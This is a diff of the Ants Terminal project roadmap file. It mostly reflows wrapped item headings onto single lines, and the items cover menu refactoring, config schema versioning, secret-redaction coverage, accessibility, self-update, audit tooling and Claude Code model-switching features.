-  + carve About to separate TU.** Phase A: `setupMenus()`
+- ✅ **[ANTS-118&] [🧹 Refactor] Extract `setupMenus()` + carve About to separate TU.** Phase A: `setupMenus()`
   (947 LoC orchestrator) split into `setupFileMenu` /
   `setupEditMenu` / `setupViewMenu` / `setupSplitMenu` /
   `setupToolsMenu` / `setupSettingsMenu` / `setupHelpMenu`
@@ -34524,9 +34211,7 @@ structural and lives elsewhere. Closing all sites in one sweep
   ableAction` and a dozen other members.
   **Source:** indie-review 2026-05-07 (Lane 4 M-1).
   **Kind:** improve.
-- ✅ **[ANTS-118&] [⚡ Performance] Replace 13
-  `findChildren<TerminalWidget*>()` walks with a
-  `QList<QPointer<TerminalWidget>>` member.**
+- ✅ **[ANTS-118&] [⚡ Performance] Replace 13 `findChildren<TerminalWidget*>()` walks with a `QList<QPointer<TerminalWidget>>` member.**
   `mainwindow.cpp:1327, 1339, 1344, 1601, 1611, 1620, 1715,
   1770, 2056, 3013, 3190, 5173` — 13 sites walk the entire
   tab-widget tree to apply a single property. With 20 tabs
@@ -34537,16 +34222,13 @@ structural and lives elsewhere. Closing all sites in one sweep
   `cleanupEmptySplitters`.
   **Source:** indie-review 2026-05-07 (Lane 4 M-2).
   **Kind:** improve.
-- ✅ **[ANTS-118&] [🧹 Refactor] Schema versioning in
-  `config.json` (`_schema: 1` + `migrate(int from, int
-  to)`).** Today's flat-`QJsonObject` store has no rename/
+- ✅ **[ANTS-118&] [🧹 Refactor] Schema versioning in `config.json` (`_schema: 1` + `migrate(int from, int to)`).** Today's flat-`QJsonObject` store has no rename/
   migrate hook. Future renames (e.g. `opacity` →
   `terminal_opacity`) have no place to translate. ~10 lines
   pre-empts the next breaking change.
   **Source:** indie-review 2026-05-07 (Lane 9 M-1).
   **Kind:** improve.
-- ✅ **[ANTS-118&] [🔒 Security] Extend `SecretRedact`
-  with Google API + GCP service-account JSON.**
+- ✅ **[ANTS-118&] [🔒 Security] Extend `SecretRedact` with Google API + GCP service-account JSON.**
   `secretredact.h:54-131` covers AWS, GitHub, OpenAI,
   Anthropic, Slack, Stripe, JWT, Bearer, PEM,
   generic-assignment. Missing: `AIza…` (Google API keys, 39
@@ -34554,8 +34236,7 @@ structural and lives elsewhere. Closing all sites in one sweep
   JSON shape. Two regex lines.
   **Source:** indie-review 2026-05-07 (Lane 11 M-1).
   **Kind:** improve.
-- ✅ **[ANTS-118&] [🖥 Platform] Tab a11y — per-tab
-  Claude state dot exposed to AT-SPI.** `coloredtabbar.cpp:
+- ✅ **[ANTS-118&] [🖥 Platform] Tab a11y — per-tab Claude state dot exposed to AT-SPI.** `coloredtabbar.cpp:
   130-151` paints the per-tab Claude state dot purely
   visually; AT-SPI/Orca read tab labels verbatim and the
   glyph is invisible to screen-readers. Add
@@ -34859,8 +34540,7 @@ zero-click, purely suggestive. Proposed in two scopes:
   symbol). The in-terminal shell ghost-suggestion (`💭` below)
   remains separate scope — different surface, different data
   source.
-- 💭 [ANTS-1068] **In-terminal shell ghost-suggestion (fish-shell style, bigger
-  scope).** As the user types at the shell prompt, ghost-suggest
+- 💭 [ANTS-1068] **In-terminal shell ghost-suggestion (fish-shell style, bigger scope).** As the user types at the shell prompt, ghost-suggest
   from shell history — fish's killer UX feature. Requires two
   pieces: (a) prompt detection (OSC 133 already provides this —
   `A`/`B`/`C` markers bracket the command line), (b) a history
@@ -35017,8 +34697,7 @@ distro." Each sub-bullet can ship independently once H1–H4 land.
   Layman: Build a website with screenshots, installation instructions and a guide for plugin authors.
   Kind: chore.
   Source: planned.
-- 📋 [ANTS-1155] **True in-app self-update for the AppImage —
-  no external `AppImageUpdate` dependency, no manual restart.**
+- 📋 [ANTS-1155] **True in-app self-update for the AppImage — no external `AppImageUpdate` dependency, no manual restart.**
   Today's "Update" click in `MainWindow::handleUpdateClicked`
   (`mainwindow.cpp:5632`) is in-place auto-update *only* when the
   user already has `AppImageUpdate` (GUI) or `appimageupdatetool`
@@ -35204,9 +34883,7 @@ here.)
 
 ### 🧰 Dev experience — Roadmap system v2
 
-- 📋 [ANTS-1157] **Project Audit tool flesh-out: aggregate /audit +
-  /indie-review + /debt-sweep history across runs and across
-  projects.** User ask 2026-05-02: *"Flesh out the Project Audit
+- 📋 [ANTS-1157] **Project Audit tool flesh-out: aggregate /audit + /indie-review + /debt-sweep history across runs and across projects.** User ask 2026-05-02: *"Flesh out the Project Audit
   tool... we can analyse all the document sweeps, /audit and
   /indie-review done for each project and the /debt-sweep as well."*
   Today's `AuditDialog` (`src/auditdialog.{cpp,h}`, ~5600 LoC)
@@ -35358,8 +35035,7 @@ here.)
   Kind: implement.
   Source: user-2026-05-02.
 
-- 📋 [ANTS-1156] **Roadmap-system audit: split, tag, integrate,
-  display, number, write — iron out how the roadmap works.**
+- 📋 [ANTS-1156] **Roadmap-system audit: split, tag, integrate, display, number, write — iron out how the roadmap works.**
   User ask 2026-05-02: *"We need to iron out how the roadmap is
   going to work."* Six concrete questions, three already partially
   covered (defer those to existing items), three genuinely
@@ -35521,8 +35197,7 @@ here.)
   Kind: research.
   Source: user-2026-05-02.
 
-- ✅ [ANTS-1154] **RoadmapDialog v2 — card-style rendering with
-  layman summaries, collapsible sections, and strict tab-relevance.**
+- ✅ [ANTS-1154] **RoadmapDialog v2 — card-style rendering with layman summaries, collapsible sections, and strict tab-relevance.**
   Layman: the roadmap dialog now shows each item as a scannable
   card with a big state icon, type chip, and one-sentence summary
   instead of a wall of prose — so you can see at a glance what's
@@ -36114,8 +35789,7 @@ contributors don't duplicate research.
   Layman: Keep your settings, plugins and saved connections in sync across your machines.
   Kind: implement.
   Source: planned.
-- 💭 [ANTS-1223] **Tasks-chip semantics during in-progress-only work
-  (revisit ANTS-1221).** User report 2026-05-10: in a Claude Code
+- 💭 [ANTS-1223] **Tasks-chip semantics during in-progress-only work (revisit ANTS-1221).** User report 2026-05-10: in a Claude Code
   session whose task list contained `2 completed + 1 in_progress
   + 0 pending`, the Tasks chip stayed hidden because ANTS-1221
   (shipped 0.7.81) flipped `unfinishedCount()` to count
@@ -36148,8 +35822,7 @@ contributors don't duplicate research.
   back, with a different look so it doesn't pretend to be
   something *you* need to do.
   Kind: design + fix. Source: user-2026-05-10.
-- ✅ [ANTS-1226] **Automatic Claude Code model switcher driven by
-  observed work complexity — Shape A: recommender chip shipped.**
+- ✅ [ANTS-1226] **Automatic Claude Code model switcher driven by observed work complexity — Shape A: recommender chip shipped.**
   *Shipped 2026-05-21 in 0.7.92 (Shape A: passive recommender chip).*
   User request 2026-05-11; re-prioritised
   2026-05-21 — Max(5) economics make every misrouted turn costly.
@@ -36208,8 +35881,7 @@ contributors don't duplicate research.
   model — saving you money on small jobs and giving you the big
   brain when you need it.
   Kind: design + implement. Source: user-2026-05-11; re-prioritised user-2026-05-21.
-- 📋 [ANTS-1735] **Automatic model selection — opt-in auto-switch
-  (Shape B of ANTS-1226).** ANTS-1226 shipped the passive recommender
+- 📋 [ANTS-1735] **Automatic model selection — opt-in auto-switch (Shape B of ANTS-1226).** ANTS-1226 shipped the passive recommender
   chip (Shape A). This item ships the active tier: when the user opts
   in, Ants Terminal auto-switches Claude Code to the recommended model
   before each turn, without requiring a manual click on the chip. The
@@ -37371,8 +37043,7 @@ contributors don't duplicate research.
   touched, so you can see what's been sitting too long.
   Kind: implement.
   Source: research-2026-05-11.
-- ✅ [ANTS-1238] **Density toggle (compact / cozy /
-  comfortable)**. Material 3 + Linear + GitHub all expose a
+- ✅ [ANTS-1238] **Density toggle (compact / cozy / comfortable)**. Material 3 + Linear + GitHub all expose a
   density selector. Spec at `docs/specs/ANTS-1238.md`
   (cold-eyes-clean after 4 loops + ~50 verified findings fixed —
   audit trail in the 2026-05-12 cold-eyes block above). Driven
